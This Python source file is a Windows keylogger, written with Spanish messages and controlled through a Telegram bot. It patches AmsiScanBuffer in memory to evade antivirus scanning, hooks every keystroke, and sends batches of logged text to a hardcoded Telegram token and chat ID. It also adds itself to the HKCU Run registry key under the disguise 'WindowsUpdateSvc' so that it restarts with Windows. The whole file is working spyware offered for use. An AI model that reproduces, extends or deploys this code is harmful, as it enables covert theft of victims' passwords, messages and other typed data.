import keyboard
import sys
import os
import threading
import requests
import telebot
import time
import winreg as reg
import ctypes
import platform

TOKEN = "8836685748:AAHNjlZMw_pyLfiFqw7RBfe7PvtKRsUdnwM"
CHAT_ID = "8382836547"

def amsi_bypass():
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")

        amsi_scan_buffer = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
        if not amsi_scan_buffer:
            print("[!] No se pudo obtener AmsiScanBuffer.")
            return False

        if platform.architecture()[0] == '64bit':

            patch = (ctypes.c_char * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
        else:

            patch = (ctypes.c_char * 7)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x14, 0x00)
     
        old_protect = ctypes.c_ulong(0)
        if not ctypes.windll.kernel32.VirtualProtect(
            amsi_scan_buffer,
            len(patch),
            0x40,  
            ctypes.byref(old_protect)
        ):
            print("[!] VirtualProtect falló.")
            return False
       
        ctypes.memmove(amsi_scan_buffer, patch, len(patch))
        
        ctypes.windll.kernel32.VirtualProtect(
            amsi_scan_buffer,
            len(patch),
            old_protect,
            ctypes.byref(old_protect)
        )

        print("[+] AMSI Bypass aplicado correctamente.")
        return True

    except Exception as e:
        print(f"[-] Error en AMSI bypass: {e}")
        return False

amsi_bypass()

palabra = ""
contador = 0
enviar = "output.txt"
capturando = False  
hook_activo = None

bot = telebot.TeleBot(TOKEN)

def telegram_send(mensaje):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": mensaje}
        r = requests.post(url, data=payload, timeout=10)
        return r.ok
    except Exception as e:
        print("Error Telegram:", e)
        return False

def telegram_send_file(ruta):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(ruta, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID}
            r = requests.post(url, files=files, data=data, timeout=15)
        return r.ok
    except Exception as e:
        print("Error enviando archivo:", e)
        return False

def reset():
    global palabra
    palabra = ""

def enter():
    global contador
    with open(enviar, "a", encoding="utf-8") as file:
        file.write(palabra + "\n")
    contador += 1
    if contador >= 5:
        threading.Thread(target=enviar_lote, daemon=True).start()
        contador = 0
    reset()

def enviar_lote():
    if os.path.exists(enviar) and os.path.getsize(enviar) > 0:
        if telegram_send_file(enviar):
            try:
                os.remove(enviar)
            except Exception:
                pass

def pul(pulsacion):
    if not capturando:
        return
    global palabra
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == "enter":
            enter()
        elif pulsacion.name == "space":
            palabra += " "
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name

def iniciar_keylogger():
    global capturando, hook_activo
    if capturando:
        return False
    capturando = True
    hook_activo = keyboard.hook(pul)
    return True

def detener_keylogger():
    global capturando, hook_activo
    if not capturando:
        return False
    capturando = False
    try:
        keyboard.unhook_all()
    except Exception:
        pass
    hook_activo = None
    if os.path.exists(enviar) and os.path.getsize(enviar) > 0:
        enviar_lote()
    return True

def activar_persistencia():
    try:
        ruta_actual = os.path.abspath(sys.argv[0])

        if ruta_actual.endswith(".py"):
            comando = f'"{sys.executable}" "{ruta_actual}"'
        else:
            comando = f'"{ruta_actual}"'

        clave = reg.HKEY_CURRENT_USER
        subclave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(clave, subclave, 0, reg.KEY_SET_VALUE) as k:
            reg.SetValueEx(k, "WindowsUpdateSvc", 0, reg.REG_SZ, comando)
        return True
    except Exception as e:
        print("Error persistencia:", e)
        return False

def quitar_persistencia():
    try:
        clave = reg.HKEY_CURRENT_USER
        subclave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(clave, subclave, 0, reg.KEY_SET_VALUE) as k:
            reg.DeleteValue(k, "WindowsUpdateSvc")
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print("Error quitando persistencia:", e)
        return False

def verificar_persistencia():
    try:
        clave = reg.HKEY_CURRENT_USER
        subclave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(clave, subclave, 0, reg.KEY_READ) as k:
            valor, _ = reg.QueryValueEx(k, "WindowsUpdateSvc")
            return valor
    except FileNotFoundError:
        return None
    except Exception:
        return None

@bot.message_handler(commands=["start"])
def cmd_start(message):
    if iniciar_keylogger():
        bot.reply_to(message, "Keylogger ENCENDIDO.")
    else:
        bot.reply_to(message, "Ya estaba encendido.")

@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    if detener_keylogger():
        bot.reply_to(message, "Keylogger APAGADO.")
    else:
        bot.reply_to(message, "Ya estaba apagado.")

@bot.message_handler(commands=["exit"])
def cmd_exit(message):
    bot.reply_to(message, "Cerrando programa...")
    detener_keylogger()
    time.sleep(1)
    os._exit(0)

@bot.message_handler(commands=["status"])
def cmd_status(message):
    estado = "ENCENDIDO" if capturando else "APAGADO"
    persist = verificar_persistencia()
    pers_txt = "Activada" if persist else "Desactivada"
    bot.reply_to(
        message,
        f"📊 Estado del keylogger:\n"
        f"- Captura: {estado}\n"
        f"- Persistencia: {pers_txt}"
    )

@bot.message_handler(commands=["persist"])
def cmd_persist(message):
    if activar_persistencia():
        bot.reply_to(message, " Persistencia ACTIVADA. Se ejecutará al iniciar Windows.")
    else:
        bot.reply_to(message, " No se pudo activar la persistencia.")

@bot.message_handler(commands=["unpersist"])
def cmd_unpersist(message):
    if quitar_persistencia():
        bot.reply_to(message, "Persistencia ELIMINADA.")
    else:
        bot.reply_to(message, "No había persistencia activa.")

@bot.message_handler(commands=["log"])
def cmd_log(message):
    if os.path.exists(enviar) and os.path.getsize(enviar) > 0:
        telegram_send_file(enviar)
    else:
        bot.reply_to(message, " No hay log pendiente.")

@bot.message_handler(commands=["help"])
def cmd_help(message):
    ayuda = (
        "🤖 *Panel de control*\n\n"
        "/start - Encender keylogger\n"
        "/stop - Apagar keylogger\n"
        "/status - Ver estado\n"
        "/log - Obtener log actual\n"
        "/persist - Activar persistencia\n"
        "/unpersist - Quitar persistencia\n"
        "/exit - Cerrar programa\n"
        "/help - Esta ayuda"
    )
    bot.reply_to(message, ayuda, parse_mode="Markdown")


def iniciar_bot():
    bot.polling(none_stop=True)


def main():
    
    amsi_bypass()
    
    threading.Thread(target=iniciar_bot, daemon=True).start()
    
    iniciar_keylogger()

    telegram_send("✅ Bot iniciado.\nUsa /help para ver los comandos.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        detener_keylogger()
        sys.exit(0)